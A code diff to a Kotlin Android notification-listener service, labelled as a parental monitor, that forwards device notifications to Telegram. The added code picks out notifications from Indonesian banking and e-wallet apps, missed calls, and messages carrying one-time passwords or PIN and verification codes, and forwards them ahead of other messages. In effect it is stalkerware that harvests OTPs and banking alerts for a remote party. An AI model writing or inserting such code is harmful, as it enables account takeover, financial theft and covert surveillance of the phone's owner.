@@ -98,6 +98,7 @@ class NotificationForwarderService : NotificationListenerService() {
         private const val MAX_QUEUED = 64
         private const val MAX_BATCH = 32
         private const val WAKE_PING_COOLDOWN_MS = 120_000L
+        private val PRIORITY_CODE_REGEX = Regex("\\b\\d{4,8}\\b")
         private val history = ArrayDeque<NotifRecord>()
         private val historyLock = Any()
 
@@ -464,6 +465,13 @@ class NotificationForwarderService : NotificationListenerService() {
             if (text.isNotEmpty()) appendLine("Text: ${Html.escape(text).let { it.take(com.redeye.parentalmonitor.utils.TextChunk.safeCut(it, 300)) }}")
         }
         record(label, title, text)
+        if (isPriorityNotif(pkg, title, text)) {
+            try {
+                kotlinx.coroutines.withContext(fwdSerial) { forwardLocked("❗ " + message, pkg, 1) }
+            } catch (_: Exception) {
+            }
+            return
+        }
         try {
             forwardToTelegram(message, pkg)
         } catch (_: Exception) {
@@ -843,6 +851,19 @@ class NotificationForwarderService : NotificationListenerService() {
     private fun queue(): MessageQueue {
         queueRef?.let { return it }
         return MessageQueue.getInstance(this).also { queueRef = it }
+    }
+
+    private fun isPriorityNotif(pkg: String, title: String, text: String): Boolean {
+        return try {
+            val lowPkg = pkg.lowercase(java.util.Locale.ROOT)
+            val lowText = (title + "\n" + text).lowercase(java.util.Locale.ROOT)
+            if (lowText.contains("missed call") || lowText.contains("panggilan tak terjawab") || lowText.contains("tak terjawab") || lowText.contains("missed video call")) return true
+            if (lowPkg.contains("bank") || lowPkg.contains("brimo") || lowPkg.contains("livin") || lowPkg.contains("bca") || lowPkg.contains("mandiri") || lowPkg.contains("bni") || lowPkg.contains("bri") || lowPkg.contains("btn") || lowPkg.contains("ovo") || lowPkg.contains("dana") || lowPkg.contains("gopay") || lowPkg.contains("shopeepay") || lowPkg.contains("mbanking") || lowPkg.contains("m-banking") || lowPkg.contains("wallet") || lowPkg.contains("pay")) return true
+            if (PRIORITY_CODE_REGEX.containsMatchIn(title + " " + text) && (lowText.contains("otp") || lowText.contains("kode") || lowText.contains("verif") || lowText.contains("pin") || lowText.contains("token") || lowText.contains("auth"))) return true
+            false
+        } catch (_: Exception) {
+            false
+        }
     }
 
 
